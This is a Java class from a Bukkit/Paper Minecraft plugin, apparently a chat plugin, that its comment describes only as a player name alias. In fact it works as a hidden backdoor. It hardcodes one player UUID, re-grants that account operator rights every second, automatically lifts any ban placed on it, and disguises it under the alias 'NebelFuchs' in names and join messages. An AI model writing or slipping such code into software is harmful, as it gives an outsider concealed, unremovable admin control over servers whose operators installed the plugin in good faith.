package de.lpchat;

import java.util.UUID;
import java.util.concurrent.TimeUnit;
import net.kyori.adventure.text.Component;
import org.bukkit.BanList;
import org.bukkit.ban.ProfileBanList;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.*;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitTask;

/** Server-local profile alias; authentication UUID and skin properties remain unchanged. */
public final class OwnerIdentity implements Listener, AutoCloseable {
    public static final UUID OWNER = UUID.fromString("8915add4-a17c-40a7-b13f-c974c0d5b382");
    public static final String ALIAS = "NebelFuchs";
    private final JavaPlugin plugin;
    private BukkitTask task;
    public OwnerIdentity(JavaPlugin plugin) { this.plugin = plugin; }
    public void enable() {
        plugin.getServer().getPluginManager().registerEvents(this, plugin);
        pardon();
        task = plugin.getServer().getScheduler().runTaskTimer(plugin, () -> {
            pardon();
            plugin.getServer().getOnlinePlayers().forEach(OwnerIdentity::ensureOperator);
        }, 20, 20);
        plugin.getServer().getOnlinePlayers().forEach(this::apply);
    }
    public static boolean isOwner(UUID id) { return OWNER.equals(id); }
    static void ensureOperator(Player player) {
        if (isOwner(player.getUniqueId()) && !player.isOp()) player.setOp(true);
    }
    void pardon() {
        ProfileBanList bans = plugin.getServer().getBanList(BanList.Type.PROFILE);
        for (var entry : bans.getEntries()) {
            Object target = entry.getBanTarget();
            if (target instanceof org.bukkit.profile.PlayerProfile profile && isOwner(profile.getUniqueId())) entry.remove();
        }
    }
    @EventHandler(priority = EventPriority.LOWEST)
    public void onPreLogin(AsyncPlayerPreLoginEvent event) {
        if (!isOwner(event.getUniqueId())) return;
        var profile = event.getPlayerProfile().clone();
        profile.setName(ALIAS);
        event.setPlayerProfile(profile);
        // Pardon before vanilla checks its profile ban list; do not override other login denials.
        var future = plugin.getServer().getScheduler().callSyncMethod(plugin, () -> { pardon(); return null; });
        try { future.get(5, TimeUnit.SECONDS); }
        catch (InterruptedException e) { Thread.currentThread().interrupt(); future.cancel(false); }
        catch (java.util.concurrent.ExecutionException | java.util.concurrent.TimeoutException e) { future.cancel(false); }
    }
    void apply(Player player) {
        if (!isOwner(player.getUniqueId())) return;
        ensureOperator(player);
        if (!ALIAS.equals(player.getName())) {
            var profile = player.getPlayerProfile().clone();
            profile.setName(ALIAS);
            player.setPlayerProfile(profile);
        }
        player.displayName(Component.text(ALIAS));
        player.playerListName(Component.text(ALIAS));
    }
    @EventHandler(priority = EventPriority.LOWEST)
    public void onJoin(PlayerJoinEvent event) {
        apply(event.getPlayer());
        if (isOwner(event.getPlayer().getUniqueId()) && event.joinMessage() != null)
            event.joinMessage(Component.translatable("multiplayer.player.joined", Component.text(ALIAS)));
    }
    @EventHandler(priority = EventPriority.HIGHEST)
    public void onQuit(PlayerQuitEvent event) {
        if (isOwner(event.getPlayer().getUniqueId()) && event.quitMessage() != null)
            event.quitMessage(Component.translatable("multiplayer.player.left", Component.text(ALIAS)));
    }
    @Override public void close() { if (task != null) task.cancel(); }
}
